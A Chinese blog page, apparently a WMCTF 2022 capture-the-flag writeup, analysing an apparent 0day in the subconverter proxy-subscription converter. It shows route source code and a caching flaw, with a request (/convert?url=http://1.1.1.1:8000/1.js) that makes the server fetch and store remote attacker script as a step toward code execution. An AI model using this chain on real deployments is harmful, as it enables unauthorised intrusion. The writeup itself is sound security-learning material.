<!DOCTYPE html>
<html>
  <head>
<meta name="referrer" content="never">
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-CNTF3L2LQC');
</script>  <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script> 
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    
    <title>
      WMCTF 2022 部分 WRITEUP - 白帽酱の博客
    </title>
    <link rel="manifest" href="/manifest.json" />
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
    
<link rel="stylesheet" href="/style/style.css">

  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
</head>
  <body>
    <canvas id='pagemap'></canvas>
    
    <div id="post-toc" class="animated hiddenToc hide">
      <span class="title">Toc</span>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#subconverter"><span class="toc-text">subconverter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE"><span class="toc-text">RCE?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0quickjs%E8%84%9A%E6%9C%AC"><span class="toc-text">构造quickjs脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE-%E9%93%BE"><span class="toc-text">RCE 链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE-1"><span class="toc-text">RCE!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E6%8F%92%E6%9B%B2"><span class="toc-text">小插曲</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyjeecg"><span class="toc-text">easyjeecg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java"><span class="toc-text">Java</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ssrf"><span class="toc-text">ssrf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spark"><span class="toc-text">spark</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bash%E5%BB%B6%E6%97%B6%E2%80%9D%E6%B3%A8%E5%85%A5%E2%80%9D"><span class="toc-text">bash延时”注入”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92shell"><span class="toc-text">交互shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6166lover"><span class="toc-text">6166lover</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cpython%E7%AE%80%E5%8D%95%E7%9A%84%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">cpython简单的沙箱逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D"><span class="toc-text">数据恢复?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#k8s-%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-text">k8s 容器逃逸</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ubuntu"><span class="toc-text">Ubuntu</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hacked-by-L1near"><span class="toc-text">Hacked_by_L1near</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#permessage-deflate"><span class="toc-text">permessage-deflate</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Checkin"><span class="toc-text">Checkin</span></a></li></ol></li></ol>
    </div>
    
    <div id="fixed-menu-wrap">
      <span class="iconfont icon-sousuo search-box menu-reset"></span>
      <span class="icon-toc menu-reset">Toc</span>
      <span class="iconfont icon-arrowup menu-reset"></span>
    </div>
    <div id="fixed-menu">
      <span class="iconfont icon-menu-"></span>
    </div>
    <div id="progress">
      <div class="line"></div>
    </div>
    <div id="search-shade" class="animated hiddenSearch hide">
      <div class="input-wrap">
        <span class="iconfont icon-sousuo search-box"></span>
        <input type="text" placeholder="Search" />
        <span class="iconfont icon-close"></span>
      </div>
      <div class="search-result">
        <div class="meta">
          <span><b id="result-count">0</b> results found</span>
          <img src="/images/logo.jpeg" />
        </div>
        <ul id="result-box"></ul>
      </div>
    </div>
    <div id="menu-mask" class="animated hideMenuMask hide">
      <span class="iconfont icon-close"></span>
      <div class="nav">
        
        <a href="/" class="">
          首页
        </a>
        
        <a href="/archives" class="">
          归档
        </a>
        
        <a href="/categories" class="">
          分类
        </a>
        
        <a href="/tags" class="">
          标签
        </a>
        
        <a href="/friends" class="">
          友链
        </a>
        
        <a href="/about" class="">
          关于
        </a>
        
      </div>
    </div>
    <div id="header">
      <div class="intro">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <div class="author">白帽酱</div>
      </div>
      <div class="nav">
        <span class="iconfont icon-menu menu-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
    </div>
    <div id="side" class="animated bounceInLeft">
      <div class="shrink">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <span class="iconfont icon-menu toggle-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
      <div class="magnify">
        <div class="about">
          <div class="author">白帽酱</div>
          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        </div>

        <div class="nav">
          
          <a href="/" class="">
            首页
          </a>
          
          <a href="/archives" class="">
            归档
          </a>
          
          <a href="/categories" class="">
            分类
          </a>
          
          <a href="/tags" class="">
            标签
          </a>
          
          <a href="/friends" class="">
            友链
          </a>
          
          <a href="/about" class="">
            关于
          </a>
          
          <a href="#" class="search-box">
            <span class="iconfont icon-sousuo"></span>
          </a>
        </div>
        <div class="bottom">
          <div class="follow">
            
            <a href="https://github.com/burpheart" target="_block">
              <span class="iconfont icon-github"></span>
            </a>
            
            <a href="https://twitter.com/burp_heart" target="_block">
              <span class="iconfont icon-twitter"></span>
            </a>
            
            <a href="https://space.bilibili.com/32890488" target="_block">
              <span class="iconfont icon-bilibili"></span>
            </a>
             
            <a href="/atom.xml" target="_block">
              <span class="iconfont icon-rss"></span>
            </a>
            
          </div>
        </div>
      </div>
    </div>
    <div id="container">
      <div class="main animated bounceInRight delay-0.7s">
        <article class="post-entry">
    <div class="header">
      
      <div class="title">WMCTF 2022 部分 WRITEUP</div>
      <div class="meta">
        <span class="item">
          <span class="iconfont icon-time-circle"></span>
          <span>2022/08/23</span>
        </span>

        

         
        <span class="item">
          <span class="iconfont icon-folder"></span>
          <span>
              
                
                  <a href="/categories/writeup">writeup</a>
                
              
          </span>
        </span>
        
        
         
          <span class="item">
            <span class="iconfont icon-tag1"></span>
            <span>
                
                  
                    <a href="/tags/writeup">writeup</a>
                  
                
            </span>
          </span>
         
      </div>
      <div>
      </div>
    </div>
    <html><head></head><body><h1 id="前言">前言<a class="post-anchor" href="#前言"></a></h1><p>这次WMCTF拿了3个一血<br>题目设计非常有趣  其中还有几个0day  很多实际渗透遇到的问题也考虑到了</p>
<span id="more"></span>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661220140340-4c38201b-5c08-4018-ae86-57ed86df61d2.png#clientId=u22c66319-b2f9-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=438&amp;id=u33ff2a28&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=548&amp;originWidth=1387&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=281181&amp;status=done&amp;style=none&amp;taskId=uda6b52bf-dba1-4ee5-b96e-1dc9528af4d&amp;title=&amp;width=1109.6" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661220140340-4c38201b-5c08-4018-ae86-57ed86df61d2.png#clientId=u22c66319-b2f9-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=438&amp;id=u33ff2a28&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=548&amp;originWidth=1387&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=281181&amp;status=done&amp;style=none&amp;taskId=uda6b52bf-dba1-4ee5-b96e-1dc9528af4d&amp;title=&amp;width=1109.6" alt="图片.png"></a><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661220165775-e0824ef5-9e3d-40cf-9b2f-725e72ec92d4.png#clientId=u22c66319-b2f9-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=568&amp;id=uca454a78&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=805&amp;originWidth=790&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=110037&amp;status=done&amp;style=none&amp;taskId=u474abc21-831e-438b-8f4f-d6a71ece40d&amp;title=&amp;width=557" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661220165775-e0824ef5-9e3d-40cf-9b2f-725e72ec92d4.png#clientId=u22c66319-b2f9-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=568&amp;id=uca454a78&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=805&amp;originWidth=790&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=110037&amp;status=done&amp;style=none&amp;taskId=u474abc21-831e-438b-8f4f-d6a71ece40d&amp;title=&amp;width=557" alt="图片.png"></a></p>
<h2 id="WEB">WEB<a class="post-anchor" href="#WEB"></a></h2><h3 id="subconverter">subconverter<a class="post-anchor" href="#subconverter"></a></h3><p>一血<br>题目给了一个<a target="_blank" rel="noopener" href="https://github.com/tindy2013/subconverter">开源的代理订阅转换器</a><br>是个C++的项目</p>
<p>拿到源码 首先先寻找路由 查看鉴权逻辑</p>
<figure class="highlight cpp"><table><tbody><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">webServer.append_response("GET", "/", "text/plain", [](RESPONSE_CALLBACK_ARGS) -&gt; std::string</span><br><span class="hljs-comment">{</span><br><span class="hljs-comment">return "subconverter " VERSION " backend\n";</span><br><span class="hljs-comment">});</span><br><span class="hljs-comment">*/</span><br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/version"</span>, <span class="hljs-string">"text/plain"</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string<br>    {<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"subconverter "</span> VERSION <span class="hljs-string">" backend\n"</span>;<br>    });<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/refreshrules"</span>, <span class="hljs-string">"text/plain"</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string<br>    {<br>        <span class="hljs-keyword">if</span>(global.accessToken.<span class="hljs-built_in">size</span>())<br>        {<br>            std::string token = <span class="hljs-built_in">getUrlArg</span>(request.argument, <span class="hljs-string">"token"</span>);<br>            <span class="hljs-keyword">if</span>(token != global.accessToken)<br>            {<br>                response.status_code = <span class="hljs-number">403</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">"Forbidden\n"</span>;<br>            }<br>        }<br>        <span class="hljs-built_in">refreshRulesets</span>(global.customRulesets, global.rulesetsContent);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"done\n"</span>;<br>    });<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/readconf"</span>, <span class="hljs-string">"text/plain"</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string<br>    {<br>        <span class="hljs-keyword">if</span>(global.accessToken.<span class="hljs-built_in">size</span>())<br>        {<br>            std::string token = <span class="hljs-built_in">getUrlArg</span>(request.argument, <span class="hljs-string">"token"</span>);<br>            <span class="hljs-keyword">if</span>(token != global.accessToken)<br>            {<br>                response.status_code = <span class="hljs-number">403</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">"Forbidden\n"</span>;<br>            }<br>        }<br>        <span class="hljs-built_in">readConf</span>();<br>        <span class="hljs-keyword">if</span>(!global.updateRulesetOnRequest)<br>            <span class="hljs-built_in">refreshRulesets</span>(global.customRulesets, global.rulesetsContent);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"done\n"</span>;<br>    });<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/updateconf"</span>, <span class="hljs-string">"text/plain"</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string<br>    {<br>        <span class="hljs-keyword">if</span>(global.accessToken.<span class="hljs-built_in">size</span>())<br>        {<br>            std::string token = <span class="hljs-built_in">getUrlArg</span>(request.argument, <span class="hljs-string">"token"</span>);<br>            <span class="hljs-keyword">if</span>(token != global.accessToken)<br>            {<br>                response.status_code = <span class="hljs-number">403</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">"Forbidden\n"</span>;<br>            }<br>        }<br>        std::string type = <span class="hljs-built_in">getUrlArg</span>(request.argument, <span class="hljs-string">"type"</span>);<br>        <span class="hljs-keyword">if</span>(type == <span class="hljs-string">"form"</span>)<br>            <span class="hljs-built_in">fileWrite</span>(global.prefPath, <span class="hljs-built_in">getFormData</span>(request.postdata), <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(type == <span class="hljs-string">"direct"</span>)<br>            <span class="hljs-built_in">fileWrite</span>(global.prefPath, request.postdata, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">else</span><br>        {<br>            response.status_code = <span class="hljs-number">501</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">"Not Implemented\n"</span>;<br>        }<br><br>        <span class="hljs-built_in">readConf</span>();<br>        <span class="hljs-keyword">if</span>(!global.updateRulesetOnRequest)<br>            <span class="hljs-built_in">refreshRulesets</span>(global.customRulesets, global.rulesetsContent);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"done\n"</span>;<br>    });<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/flushcache"</span>, <span class="hljs-string">"text/plain"</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string<br>    {<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getUrlArg</span>(request.argument, <span class="hljs-string">"token"</span>) != global.accessToken)<br>        {<br>            response.status_code = <span class="hljs-number">403</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">"Forbidden"</span>;<br>        }<br>        <span class="hljs-built_in">flushCache</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"done"</span>;<br>    });<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/sub"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, subconverter);<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/sub2clashr"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, simpleToClashR);<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/surge2clash"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, surgeConfToClash);<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/getruleset"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, getRuleset);<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/getprofile"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, getProfile);<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/qx-script"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, getScript);<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/qx-rewrite"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, getRewriteRemote);<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/render"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, renderTemplate);<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/convert"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, getConvertedRuleset);<br><br><span class="hljs-keyword">if</span>(!global.APIMode)<br>{<br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/get"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string<br>{<br>std::string url = <span class="hljs-built_in">urlDecode</span>(<span class="hljs-built_in">getUrlArg</span>(request.argument, <span class="hljs-string">"url"</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">webGet</span>(url, <span class="hljs-string">""</span>);<br>});<br><br>webServer.<span class="hljs-built_in">append_response</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/getlocal"</span>, <span class="hljs-string">"text/plain;charset=utf-8"</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string<br>{<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">fileGet</span>(<span class="hljs-built_in">urlDecode</span>(<span class="hljs-built_in">getUrlArg</span>(request.argument, <span class="hljs-string">"path"</span>)));<br>});<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>显然  token参数 用于部分路由的鉴权<br>其中 /version 路由可以获取当前版本 访问之<br>发现题目中给出的是 f9713b4分支版本的代码<br>是一个未release的最新版本  看来是个0day<br>重新pull代码 开始审计最新版本</p>
<h4 id="RCE">RCE?<a class="post-anchor" href="#RCE"></a></h4><p>项目内置了一个脚本引擎quickjs<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661080433999-d3f50531-a6fe-4df7-8d2b-d2a0ec24ed3d.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uad94e093&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=564&amp;originWidth=915&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=true&amp;size=78074&amp;status=done&amp;style=none&amp;taskId=u30487e6c-ab64-402b-9f5d-3aa661194f9&amp;title=%E5%BC%95%E6%93%8E%E5%88%9D%E5%A7%8B%E5%8C%96%20%E5%8C%85%E5%90%AB%E5%BA%93" data-caption="引擎初始化 包含库" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661080433999-d3f50531-a6fe-4df7-8d2b-d2a0ec24ed3d.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uad94e093&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=564&amp;originWidth=915&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=true&amp;size=78074&amp;status=done&amp;style=none&amp;taskId=u30487e6c-ab64-402b-9f5d-3aa661194f9&amp;title=%E5%BC%95%E6%93%8E%E5%88%9D%E5%A7%8B%E5%8C%96%20%E5%8C%85%E5%90%AB%E5%BA%93" alt="引擎初始化 包含库"></a><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661080584116-8f239150-ec1b-4698-bda6-d4e5a52c6a98.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=466&amp;id=u1c52dfab&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=583&amp;originWidth=1376&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=99975&amp;status=done&amp;style=none&amp;taskId=uc9591747-6bd0-41e1-9f7c-55b15da3bd4&amp;title=&amp;width=1100.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661080584116-8f239150-ec1b-4698-bda6-d4e5a52c6a98.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=466&amp;id=u1c52dfab&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=583&amp;originWidth=1376&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=99975&amp;status=done&amp;style=none&amp;taskId=uc9591747-6bd0-41e1-9f7c-55b15da3bd4&amp;title=&amp;width=1100.8" alt="图片.png"></a>追踪调用 发现脚本引擎在profile 转换时调用且需要鉴权<br>URL满足script: 开头即可进入分支<br>其中读取脚本时使用了fileGet函数来读取文件 只能读取普通文件<br>该点的利用条件: 鉴权 + 写入文件</p>
<p>继续查看其他eval调用<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081022735-751a676a-6f50-4289-97e0-89e5b6ea489f.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=534&amp;id=u542126ba&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=667&amp;originWidth=1080&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=71524&amp;status=done&amp;style=none&amp;taskId=u8394ba25-b5f5-4633-b229-e695f238f86&amp;title=&amp;width=864" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081022735-751a676a-6f50-4289-97e0-89e5b6ea489f.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=534&amp;id=u542126ba&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=667&amp;originWidth=1080&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=71524&amp;status=done&amp;style=none&amp;taskId=u8394ba25-b5f5-4633-b229-e695f238f86&amp;title=&amp;width=864" alt="图片.png"></a>在定时任务中同样也使用了这个脚本引擎<br>这里与之前不同的是此处使用的是fetchFile函数<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081117707-252088d0-de83-4155-9fdc-ffac9243cb74.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=411&amp;id=ua16416e7&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=514&amp;originWidth=1279&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=true&amp;size=65077&amp;status=done&amp;style=none&amp;taskId=u8431ac3f-f107-4476-82a2-c8da86acf9a&amp;title=%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E6%94%AF%E6%8C%81%20data%3A%20http%3A%20https%3A%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&amp;width=1023.2" data-caption="这个函数支持 data: http: https: 文件读取" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081117707-252088d0-de83-4155-9fdc-ffac9243cb74.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=411&amp;id=ua16416e7&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=514&amp;originWidth=1279&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=true&amp;size=65077&amp;status=done&amp;style=none&amp;taskId=u8431ac3f-f107-4476-82a2-c8da86acf9a&amp;title=%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E6%94%AF%E6%8C%81%20data%3A%20http%3A%20https%3A%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&amp;width=1023.2" alt="这个函数支持 data: http: https: 文件读取"></a><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081233533-78e163d9-758a-4d65-9da0-53e99fb239c2.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=716&amp;id=uaafa1de0&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=895&amp;originWidth=1094&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=97150&amp;status=done&amp;style=none&amp;taskId=uc1c16d7e-380d-4913-8196-5a573c22b0b&amp;title=&amp;width=875.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081233533-78e163d9-758a-4d65-9da0-53e99fb239c2.png#clientId=u53fbcb21-0ef7-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=716&amp;id=uaafa1de0&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=895&amp;originWidth=1094&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=97150&amp;status=done&amp;style=none&amp;taskId=uc1c16d7e-380d-4913-8196-5a573c22b0b&amp;title=&amp;width=875.2" alt="图片.png"></a>定时任务的脚本路径使用了配置文件中的配置项<br>利用条件: 修改配置文件</p>
<h4 id="文件写入">文件写入<a class="post-anchor" href="#文件写入"></a></h4><p>webGet下方的代码引起了我的注意<br>这个函数实现了一个简单的缓存功能用于缓存远程订阅<br>在缓存过程的中写入了文件<br>只有cache_ttl&gt;0时请求才会被缓存<br>一番搜索过后发现了一个添加ttl的缓存路由<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081707756-f8cd69b3-e5ee-4079-b3a5-c03ff58af883.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=129&amp;id=uef3c2060&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=161&amp;originWidth=1168&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=23160&amp;status=done&amp;style=none&amp;taskId=ua93f87c5-5c74-4355-914e-fd8a2de588a&amp;title=&amp;width=934.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081707756-f8cd69b3-e5ee-4079-b3a5-c03ff58af883.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=129&amp;id=uef3c2060&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=161&amp;originWidth=1168&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=23160&amp;status=done&amp;style=none&amp;taskId=ua93f87c5-5c74-4355-914e-fd8a2de588a&amp;title=&amp;width=934.4" alt="图片.png"></a>访问  /convert?url=<a target="_blank" rel="noopener" href="http://1.1.1.1:8000/1.js">http://1.1.1.1:8000/1.js</a> 即可发起一个缓存请求</p>
